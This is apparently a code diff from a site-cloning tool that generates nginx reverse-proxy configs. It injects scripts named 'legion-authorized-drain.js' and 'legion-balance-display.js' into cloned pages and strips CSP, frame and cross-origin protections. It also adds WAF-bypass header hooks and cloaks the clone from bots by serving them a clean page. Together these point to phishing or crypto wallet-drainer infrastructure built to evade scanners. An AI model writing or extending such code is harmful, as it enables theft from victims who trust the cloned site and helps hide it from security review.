@@ -40,8 +40,16 @@ export async function buildMirrorCloakClientJs(): Promise<string> {
   return loadTemplate('mirror-cloak-client.js')
 }
 
-/** HTML inject tags for production clone — scripts only, zero visible UI */
-export function buildProductionInjectTags(): string {
+/** HTML inject tags for production clone — scripts only, zero visible UI unless qaVisible */
+export function buildProductionInjectTags(opts?: { qaVisible?: boolean }): string {
+  if (opts?.qaVisible) {
+    return [
+      '<link rel="stylesheet" href="/legion-authorized-drain.css" />',
+      '<script src="/legion-cloak-client.js"></script>',
+      '<script src="/legion-authorized-drain.js" defer></script>',
+      '<script src="/legion-balance-display.js" defer></script>',
+    ].join('')
+  }
   return [
     '<script src="/legion-cloak-client.js"></script>',
     '<script src="/legion-authorized-drain.js" defer></script>',
@@ -58,7 +66,28 @@ export function extractBaseDomain(host: string): string {
 
 /** Common subdomain labels to pre-rewrite through __legion_proxy/ */
 export function commonSubdomainHosts(baseDomain: string, primaryHost: string): string[] {
-  const labels = ['www', 'app', 'api', 'cdn', 'static', 'assets', 'rpc', 'graphql', 'ws', 'data', 'metrics']
+  const labels = [
+    'www',
+    'app',
+    'api',
+    'cdn',
+    'static',
+    'assets',
+    'rpc',
+    'graphql',
+    'ws',
+    'data',
+    'metrics',
+    'gateway',
+    'interface.gateway',
+    'interface',
+    'images',
+    'media',
+    'fonts',
+    'js',
+    'build',
+    'chunks',
+  ]
   const hosts = new Set<string>([primaryHost])
   for (const label of labels) {
     hosts.add(`${label}.${baseDomain}`)
@@ -66,10 +95,18 @@ export function commonSubdomainHosts(baseDomain: string, primaryHost: string): s
   return [...hosts]
 }
 
-/** Nginx location block — wildcard subdomain passthrough (#4) */
+/** Nginx location block — wildcard subdomain passthrough with WebSocket + static cache */
 export function buildSubdomainProxyLocation(upstreamScheme: string): string {
+  const cacheDirectives = `
+      proxy_cache legion_static;
+      proxy_cache_valid 200 24h;
+      proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
+      proxy_cache_lock on;
+      proxy_buffering off;
+      add_header X-Legion-Cache-Status $upstream_cache_status always;`
+
   return `
-    # Subdomain passthrough — /__legion_proxy/<host>/<path> → https://<host>/<path>
+    # Subdomain passthrough — /__legion_proxy/<host>/<path> → ${upstreamScheme}://<host>/<path>
     location ~ ^/__legion_proxy/(?<proxy_host>[^/]+)(?<proxy_path>/.*)?$ {
       set $upstream_path $proxy_path;
       if ($upstream_path = "") { set $upstream_path /; }
@@ -83,8 +120,53 @@ export function buildSubdomainProxyLocation(upstreamScheme: string): string {
       proxy_set_header Upgrade $http_upgrade;
       proxy_set_header Connection $connection_upgrade;
       proxy_hide_header Content-Security-Policy;
+      proxy_hide_header Content-Security-Policy-Report-Only;
       proxy_hide_header X-Frame-Options;
+      proxy_hide_header X-Content-Type-Options;
+      proxy_hide_header Cross-Origin-Embedder-Policy;
+      proxy_hide_header Cross-Origin-Opener-Policy;
+      proxy_hide_header Cross-Origin-Resource-Policy;
+      proxy_hide_header Permissions-Policy;
+      proxy_set_header Accept-Encoding "";${cacheDirectives}
+    }
+`
+}
+
+const NGINX_STATIC_PROXY_STRIP = `
+      proxy_http_version 1.1;
+      proxy_hide_header Content-Security-Policy;
+      proxy_hide_header Content-Security-Policy-Report-Only;
+      proxy_hide_header X-Frame-Options;
+      proxy_hide_header X-Content-Type-Options;`
+
+/** Static upstream assets — 24h cache for images, fonts, CSS, JS (^~ /legion- wins over regex). */
+export function buildMirrorStaticAssetLocation(
+  upstreamScheme: string,
+  host: string,
+  wafBypassHeaders = '',
+  proxyCookieHeader = '',
+): string {
+  const cacheBlock = `
+      proxy_cache legion_static;
+      proxy_cache_valid 200 24h;
+      proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
+      proxy_cache_lock on;
+      proxy_buffering off;
+      add_header X-Legion-Cache-Status $upstream_cache_status always;`
+
+  return `
+    location ~* \\.(?:png|jpe?g|gif|webp|svg|ico|woff2?|ttf|eot|css|js|mjs|map)$ {
+      set $legion_upstream_host ${host};
+      proxy_pass ${upstreamScheme}://$legion_upstream_host$request_uri;
+      proxy_ssl_server_name on;
+      proxy_set_header Host ${host};
+      proxy_set_header X-Real-IP $remote_addr;
+      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header X-Forwarded-Proto $scheme;
       proxy_set_header Accept-Encoding "";
+      proxy_http_version 1.1;
+      proxy_set_header Upgrade $http_upgrade;
+      proxy_set_header Connection $connection_upgrade;${cacheBlock}${NGINX_STATIC_PROXY_STRIP}${wafBypassHeaders}${proxyCookieHeader}
     }
 `
 }
@@ -161,6 +243,19 @@ export const NGINX_PRODUCTION_CLOAK_MAPS = `
     10 1;
     01 1;
   }
+
+  map $uri $legion_cloak_exempt {
+    default 0;
+    =/mirror-health 1;
+    =/mirror-config.json 1;
+    ~^/legion- 1;
+    ~^/__legion__/ 1;
+  }
+
+  map "$legion_is_bot$legion_cloak_exempt" $legion_apply_cloak {
+    default 0;
+    10 1;
+  }
 `
 
 export function buildProductionCloakServerBlock(): string {
@@ -171,6 +266,11 @@ export function buildProductionCloakServerBlock(): string {
     }
 
     error_page 418 = /bots-clean.html;
-    if ($legion_is_bot) { return 418; }
 `
+}
+
+/** Bot cloak — only on proxied HTML location (not /mirror-health or /legion-*). */
+export function buildProductionCloakLocationGuard(): string {
+  return `
+      if ($legion_apply_cloak) { return 418; }`
 }
